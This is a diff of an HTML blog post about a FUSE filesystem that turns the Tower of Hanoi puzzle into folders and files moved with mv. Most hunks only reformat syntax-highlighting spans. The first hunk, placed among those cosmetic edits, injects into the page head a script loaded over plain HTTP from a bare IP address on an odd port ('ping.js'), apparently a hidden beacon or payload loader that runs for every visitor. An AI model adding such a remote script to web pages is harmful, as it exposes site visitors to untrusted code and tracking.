@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -96,71 +98,71 @@ February 7, 2022
 <h2 id="code-overview">Code overview</h2>
 <p>Three FUSE hooks are required for this:</p>
 <ul>
-<li><code><span class="highlight-candombe-inline"><span class="n">getattr</span><span class="w"></span></span></code> to define which entries are files and which are folders</li>
-<li><code><span class="highlight-candombe-inline"><span class="n">readdir</span><span class="w"></span></span></code> to list which entries are in which folder.</li>
-<li><code><span class="highlight-candombe-inline"><span class="n">rename</span><span class="w"></span></span></code> to enforce the rules of Tower of Hanoi.</li>
+<li><code><span class="highlight-candombe-inline"><span class="n">getattr</span></span></code> to define which entries are files and which are folders</li>
+<li><code><span class="highlight-candombe-inline"><span class="n">readdir</span></span></code> to list which entries are in which folder.</li>
+<li><code><span class="highlight-candombe-inline"><span class="n">rename</span></span></code> to enforce the rules of Tower of Hanoi.</li>
 </ul>
 <p>These plus some extra bits are implemented in <a href="https://github.com/eldipa/hanoifs/blob/master/hanoifs.c">hanoifs.c</a>.</p>
 <p>Behind scenes, the logic of the game is handled by <a href="https://github.com/eldipa/hanoifs/blob/master/hanoi.c">hanoi.c</a>.</p>
 <p>To keep the code simple, each tower (peg) is represented by a bit stack: a bit vector with a LIFO discipline, coded at <a href="https://github.com/eldipa/hanoifs/blob/master/bitstack.c">bitstack.c</a>.</p>
 <h2 id="hanoi-fs">Hanoi FS</h2>
-<p>Once compiled, you can mount the puzzle running <code><span class="highlight-candombe-inline"><span class="n">hanoifs</span><span class="w"></span></span></code></p>
-<div class="highlight-candombe"><pre><span></span><code>$ ./hanoifs mnt/
+<p>Once compiled, you can mount the puzzle running <code><span class="highlight-candombe-inline"><span class="n">hanoifs</span></span></code></p>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>./hanoifs<span class="w"> </span>mnt/
 </code></pre></div>
 
 <p>Within the mounted file system the folders represent the <em>towers</em> of Hanoi</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ls -lah mnt/
-total <span class="m">4</span>.0K
-drwxr-xr-x <span class="m">5</span> root root    <span class="m">0</span> Jan  <span class="m">1</span>  <span class="m">1970</span> .
-drwxr-xr-x &lt;...&gt; ..
-drwxr-xr-x <span class="m">2</span> root root    <span class="m">0</span> Jan  <span class="m">1</span>  <span class="m">1970</span> A
-drwxr-xr-x <span class="m">2</span> root root    <span class="m">0</span> Jan  <span class="m">1</span>  <span class="m">1970</span> B
-drwxr-xr-x <span class="m">2</span> root root    <span class="m">0</span> Jan  <span class="m">1</span>  <span class="m">1970</span> C
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ls<span class="w"> </span>-lah<span class="w"> </span>mnt/
+total<span class="w"> </span><span class="m">4</span>.0K
+drwxr-xr-x<span class="w"> </span><span class="m">5</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">0</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span>&lt;...&gt;<span class="w"> </span>..
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">0</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span>A
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">0</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span>B
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">    </span><span class="m">0</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span>C
 </code></pre></div>
 
 <p>Inside each folder there are the files which represent the <em>discs</em> of the game.</p>
 <p>Initially all the files (discs) are in the first folder (tower).</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ls -lah mnt/A
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ls<span class="w"> </span>-lah<span class="w"> </span>mnt/A
 mnt/A:
-total <span class="m">0</span>
-drwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Jan  <span class="m">1</span>  <span class="m">1970</span> .
-drwxr-xr-x <span class="m">5</span> root root <span class="m">0</span> Jan  <span class="m">1</span>  <span class="m">1970</span> ..
--r--r--r-- <span class="m">1</span> root root <span class="m">1</span> Jan  <span class="m">1</span>  <span class="m">1970</span> <span class="m">0</span>
--r--r--r-- <span class="m">1</span> root root <span class="m">2</span> Jan  <span class="m">1</span>  <span class="m">1970</span> <span class="m">1</span>
--r--r--r-- <span class="m">1</span> root root <span class="m">4</span> Jan  <span class="m">1</span>  <span class="m">1970</span> <span class="m">2</span>
+total<span class="w"> </span><span class="m">0</span>
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">0</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">5</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">0</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span>..
+-r--r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">1</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span><span class="m">0</span>
+-r--r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">2</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span><span class="m">1</span>
+-r--r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">4</span><span class="w"> </span>Jan<span class="w">  </span><span class="m">1</span><span class="w">  </span><span class="m">1970</span><span class="w"> </span><span class="m">2</span>
 </code></pre></div>
 
-<p>The traditional <code><span class="highlight-candombe-inline"><span class="n">mv</span><span class="w"></span></span></code> is used to move the discs. Under the hood any program that issue the <code><span class="highlight-candombe-inline"><span class="n">rename</span><span class="w"></span></span></code> syscall will be allowed.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ mv mnt/A/0 mnt/C
+<p>The traditional <code><span class="highlight-candombe-inline"><span class="n">mv</span></span></code> is used to move the discs. Under the hood any program that issue the <code><span class="highlight-candombe-inline"><span class="n">rename</span></span></code> syscall will be allowed.</p>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>mv<span class="w"> </span>mnt/A/0<span class="w"> </span>mnt/C
 </code></pre></div>
 
 <p>Not all the movements are possible however; the movements are restricted following the rules of the puzzle.</p>
 <p>You cannot move a disc that is not in the top of its tower (it is not the smallest file); you cannot move a disc to a tower on top of a disc smaller either.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ mv mnt/A/2 mnt/B
-mv: cannot move <span class="s1">&#39;mnt/A/2&#39;</span> to <span class="s1">&#39;mnt/B/2&#39;</span>: Permission denied
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>mv<span class="w"> </span>mnt/A/2<span class="w"> </span>mnt/B
+mv:<span class="w"> </span>cannot<span class="w"> </span>move<span class="w"> </span><span class="s1">&#39;mnt/A/2&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;mnt/B/2&#39;</span>:<span class="w"> </span>Permission<span class="w"> </span>denied
 
-$ mv mnt/A/1 mnt/C
-mv: cannot move <span class="s1">&#39;mnt/A/1&#39;</span> to <span class="s1">&#39;mnt/C/1&#39;</span>: Permission denied
+$<span class="w"> </span>mv<span class="w"> </span>mnt/A/1<span class="w"> </span>mnt/C
+mv:<span class="w"> </span>cannot<span class="w"> </span>move<span class="w"> </span><span class="s1">&#39;mnt/A/1&#39;</span><span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;mnt/C/1&#39;</span>:<span class="w"> </span>Permission<span class="w"> </span>denied
 </code></pre></div>
 
 <h2 id="puzzle-solution">Puzzle solution</h2>
 <!--
 $ mv mnt/C/0 mnt/A/0
 -->
-<p>The goal of the Hanoi Towers is to move all the discs to the latest tower (the latest folder, <code><span class="highlight-candombe-inline"><span class="n">C</span><span class="w"></span></span></code> in our case).</p>
+<p>The goal of the Hanoi Towers is to move all the discs to the latest tower (the latest folder, <code><span class="highlight-candombe-inline"><span class="n">C</span></span></code> in our case).</p>
 <p>Here is the complete solution:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ mv mnt/A/0 mnt/C
-$ mv mnt/A/1 mnt/B
-$ mv mnt/C/0 mnt/B
-$ mv mnt/A/2 mnt/C
-$ mv mnt/B/0 mnt/A
-$ mv mnt/B/1 mnt/C
-$ mv mnt/A/0 mnt/C
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>mv<span class="w"> </span>mnt/A/0<span class="w"> </span>mnt/C
+$<span class="w"> </span>mv<span class="w"> </span>mnt/A/1<span class="w"> </span>mnt/B
+$<span class="w"> </span>mv<span class="w"> </span>mnt/C/0<span class="w"> </span>mnt/B
+$<span class="w"> </span>mv<span class="w"> </span>mnt/A/2<span class="w"> </span>mnt/C
+$<span class="w"> </span>mv<span class="w"> </span>mnt/B/0<span class="w"> </span>mnt/A
+$<span class="w"> </span>mv<span class="w"> </span>mnt/B/1<span class="w"> </span>mnt/C
+$<span class="w"> </span>mv<span class="w"> </span>mnt/A/0<span class="w"> </span>mnt/C
 </code></pre></div>
 
 <p>Once completed, a special file will appear at the root:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ ls mnt/           <span class="c1"># byexample: +norm-ws</span>
- A   B   C  <span class="s1">&#39;you win&#39;</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>ls<span class="w"> </span>mnt/<span class="w">           </span><span class="c1"># byexample: +norm-ws</span>
+<span class="w"> </span>A<span class="w">   </span>B<span class="w">   </span>C<span class="w">  </span><span class="s1">&#39;you win&#39;</span>
 </code></pre></div>
 
 <!--
